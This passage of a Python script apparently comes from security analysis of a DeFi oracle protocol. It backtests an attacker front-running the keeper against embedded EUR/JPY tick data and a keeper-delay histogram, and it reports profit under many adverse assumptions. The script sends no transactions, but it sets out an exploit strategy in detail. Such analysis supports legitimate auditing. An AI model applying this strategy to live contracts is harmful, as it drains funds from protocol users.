XHIST (blocks, count): delay from the first block of a tick's second to the keeper's execution block, 320 executions
      on the public v2.0.0 Arbitrum Sepolia deployment; one block is about 0.269 s.
Model basket move = (1 + bE*scale)*SE*rEUR + (1 + bJ*scale)*SJ*rJPY - err; confidence = SE*cEUR + SJ*cJPY + ratio*cEUR;
      break-even = 8.06 + 0.25*(confidence at entry + at close), fitted to contract runs (all bp);
      profit = N*(favourable move at the close tick - break-even).
Time  Orders are committed in second R; entry tick R+1; the rule (move >= theta) is applied at tick R+s, s = 2..4; the
      attacker's transaction lands `delay` s after that tick and is first iff the keeper's block is later.
Close Committed in second q = R+s+floor(delay)+exit_extra with a W-second window; only tick q+1 is eligible. If its
      confidence exceeds the oracle's 10 bp limit the close stays pending until it can be expired after q+W and
      recommitted, so the next eligible tick is q+W+2. Every exercised position is carried to a close tick; the script
      raises if that tick is not embedded. Totals exclude failed-attempt bounties and gas.
"""
import math, datetime
DATA = {
 1786105800: [115283,11,158347,16,115406,44,158340,187,115454,14,158088,36,115531,59,158009,54,115545,46,158005,68,115540,11,157969,68,115568,26,157934,56,115619,38,157832,154,115633,34,157749,228],
 1786537800: [115489,28,158964,52,115601,88,158797,149,115584,41,158764,131,115618,38,158715,36,115552,9,158755,19,115514,13,158790,39,115458,8,158917,55,115432,22,158950,36,115371,31,158983,66],
 1788438600: [116106,8,155791,11,116191,42,155702,78,116196,32,155652,127,116219,20,155632,36,116235,14,155591,43,116239,12,155578,42,116229,14,155609,51,116223,12,155615,21,116195,28,155640,27],
 1788525000: [116263,8,156039,25,116191,219,156198,379,115924,27,156619,204,115919,25,156672,43,115921,14,156692,28,115915,14,156669,30,115911,12,156666,32,115887,16,156695,25,115880,11,156691,32],
 1789129800: [115975,16,153928,20,115820,61,154212,261,115764,23,154339,156,115748,7,154383,57,115769,18,154272,95,115770,13,154334,36,115752,6,154399,28,115746,6,154415,24,115749,3,154386,32],
 1790944200: [112331,11,157549,22,112536,207,157274,224,112572,20,157210,99,112582,31,157204,28,112602,13,157200,18,112601,15,157195,16,112574,10,157215,24,112541,9,157332,26,112516,13,157339,25],
 1791981000: [111979,10,158419,13,111811,86,158547,101,111750,10,158636,22,111726,23,158659,42,111732,12,158651,30,111718,13,158649,10,111726,20,158650,24,111703,15,158679,22,111690,19,158678,21],
 1792067400: [112068,9,158032,14,112042,59,158082,43,111957,53,158123,24,111950,18,158112,71,111928,20,158149,28,111920,11,158149,17,111913,13,158153,17,111896,23,158163,19,111893,15,158161,15],
 1793971800: [111644,9,158349,17,111504,61,158440,91,111480,24,158483,107,111468,18,158532,35,111462,10,158538,35,111484,25,158473,37,111503,11,158442,26,111495,15,158447,21,111480,9,158477,17],
 1794317400: [112136,8,158134,38,112039,75,158276,85,111987,24,158327,72,111952,15,158341,30,111936,15,158348,37,111923,10,158374,24,111884,28,158398,38,111881,13,158423,49,111935,22,158352,21],
}
XHIST = [(1,1),(2,13),(3,29),(4,41),(5,58),(6,54),(7,47),(8,28),(9,15),(10,11),(11,6),(12,2),(14,2),(16,1),(18,1),(20,2),(23,1),(24,3),(25,2),(26,1),(29,1),(30,1)]
X = [b for b, n in XHIST for _ in range(n)]
bE, bJ, SE, SJ = 0.3566, 0.2302, 0.5684, 0.1404
N = 7_683_000; BLOCK = 0.269; LIMIT = 10.0; W = 2; LAST = 9
RATIO = {'median': 0.5724, 'p90': 0.890, '2x p90': 1.780}
def tick(row, k):
    if k > LAST: raise RuntimeError('tick R+%d is not embedded' % k)
    return row[4 * k - 4:4 * k]
def move(row, k0, k1, scale):
    (e0, _, j0, _), (e1, _, j1, _) = tick(row, k0), tick(row, k1)
    return (1 + bE * scale) * SE * (e1 / e0 - 1) * 1e4 + (1 + bJ * scale) * SJ * (j0 / j1 - 1) * 1e4
def conf(row, k, ratio):
    e, ce, j, cj = tick(row, k)
    return (SE + ratio) * ce / e * 1e4 + SJ * cj / j * 1e4
def run(theta=8.5, delay=0.6, scale=1.0, err=0.0, ratio='p90', exit_extra=0, verbose=False):
    r = RATIO[ratio]; fired = win = rejected = 0; first = ev = 0.0
    for R, row in sorted(DATA.items()):
        for s in (2, 3, 4):
            raw = move(row, 1, s, scale); sign = 1 if raw > 0 else -1
            if abs(raw) - err < theta: continue
            if conf(row, 1, r) > LIMIT: break                 # the increase itself cannot execute: no position
            q = s + math.floor(delay) + exit_extra; rej = 0   # second in which the close is committed
            while conf(row, q + 1, r) > LIMIT: q += W + 1; rej += 1   # rejected: wait out the window, expire, recommit
            be = 8.06 + 0.25 * (conf(row, 1, r) + conf(row, q + 1, r))
            fav = sign * move(row, 1, q + 1, scale)
            prof = N * (fav - err - be) / 1e4
            p = sum(x > math.ceil((s - 1 + delay) / BLOCK - 1e-9) for x in X) / len(X)
            fired += 1; win += prof > 0; first += prof; ev += p * prof; rejected += rej
            if verbose:
                print('   %s fires at R+%d (seen %5.2f bp), close tick R+%-2d (%5.2f bp, break-even %5.2f) %+7.0f if first, P(first) %4.1f%%, closes rejected %d' % (
                    datetime.datetime.fromtimestamp(R, datetime.timezone.utc).strftime('%Y-%m-%d %H:%M'), s, sign * raw, q + 1, fav, be, prof, p * 100, rej))
            break
    return fired, win, first, ev, rejected
def line(label, **kw):
    print('%-56s fired %2d  win %2d  lose %2d  sum if first %+7.0f  expected %+7.0f  closes rejected %d' % ((label,) + (lambda f, w, a, e, r: (f, w, f - w, a, e, r))(*run(**kw))))
if __name__ == '__main__':
    print('windows embedded: %d of 109 examined | keeper sample: %d' % (len(DATA), len(X)))
    print('1. Attacker inclusion delay after the observed tick (the close tick moves with it)')
    for d in (0.3, 0.6, 0.9, 1.1, 1.5, 2.1): line('delay %.1f s' % d, delay=d)
    run(verbose=True)
    print('2. Error in the four calibrated feeds (delay 0.6 s)')
    line('central fit'); line('basket move 0.36 bp worse (1 RMS)', err=0.36); line('basket move 0.72 bp worse (2 RMS)', err=0.72)
    line('basket move 1.17 bp worse (largest observed error)', err=1.17); line('four feeds move half as much', scale=0.5)
    line('four feeds do not move at all', scale=0.0); line('four feeds move 1.5x as much', scale=1.5)
    print('3. Confidence of the four calibrated feeds, as a ratio to EUR confidence (delay 0.6 s)')
    for k in RATIO: line(k, ratio=k)
    run(ratio='2x p90', verbose=True)
    print('4. Later exit: extra seconds before the close is committed (delay 0.6 s)')
    for x in (0, 1, 2, 3): line('exit %d s later' % x, exit_extra=x)
    print('5. Rule threshold (delay 0.6 s)')
    for th in (8.5, 10.0, 12.0): line('rule %.1f bp' % th, theta=th)
    print('6. Combined adverse cases')
    line('1.1 s, 0.72 bp worse, 2x p90 confidence, exit 1 s later', delay=1.1, err=0.72, ratio='2x p90', exit_extra=1)
    line('same, four feeds not moving', delay=1.1, scale=0.0, ratio='2x p90', exit_extra=1)
    line('same, rule 10 bp', delay=1.1, err=0.72, ratio='2x p90', exit_extra=1, theta=10.0)
```
